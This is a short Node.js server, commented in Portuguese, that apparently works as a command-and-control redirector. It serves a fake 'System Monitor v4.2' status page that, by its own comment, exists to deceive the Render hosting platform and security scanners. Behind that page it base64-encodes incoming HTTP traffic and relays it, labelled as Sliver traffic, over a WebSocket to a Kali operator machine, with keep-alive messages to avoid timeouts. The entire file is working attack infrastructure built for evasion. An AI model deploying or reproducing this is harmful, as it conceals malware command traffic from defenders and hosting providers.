const WebSocket = require('ws');
const http = require('http');

const PORT = process.env.PORT || 10000;
let KALI_WS = null;

const server = http.createServer((req, res) => {
    // 1. Simulação de Site Real (Engana o Render e scanners)
    if (req.method === 'GET' && !req.url.includes('id=')) {
        res.writeHead(200, {'Content-Type': 'text/html'});
        res.end(`
            <html>
                <head><title>System Monitor v4.2</title></head>
                <body style="background:#1a1a1a;color:#00ff00;font-family:monospace;padding:20px;">
                    <h2>> System Status: OK</h2>
                    <p>> Uptime: ${process.uptime().toFixed(0)}s</p>
                    <p>> Nodes: Active</p>
                    <div style="border:1px solid #333;padding:10px;">Monitoring background processes...</div>
                </body>
            </html>
        `);
        return;
    }

    // 2. Encaminhamento de Tráfego C2
    let body = [];
    req.on('data', chunk => body.push(chunk));
    req.on('end', () => {
        const payload = Buffer.concat(body).toString('base64');
        if (KALI_WS && KALI_WS.readyState === WebSocket.OPEN) {
            KALI_WS.send(JSON.stringify({
                type: 'SLIVER_TRAFFIC',
                path: req.url,
                method: req.method,
                headers: req.headers,
                data: payload
            }));
            res.writeHead(200); res.end();
        } else {
            res.writeHead(503); res.end();
        }
    });
});

const wss = new WebSocket.Server({ server });
wss.on('connection', (ws, req) => {
    if (req.url.includes('id=KALI')) {
        KALI_WS = ws;
        // Anti-timeout: Envia um pequeno sinal a cada 30s para manter o WebSocket vivo
        const timer = setInterval(() => {
            if (ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify({type: 'KEEP_ALIVE'}));
            else clearInterval(timer);
        }, 30000);
    }
});

server.listen(PORT, () => console.log(`Redirecionador Profissional Ativo na porta ${PORT}`));
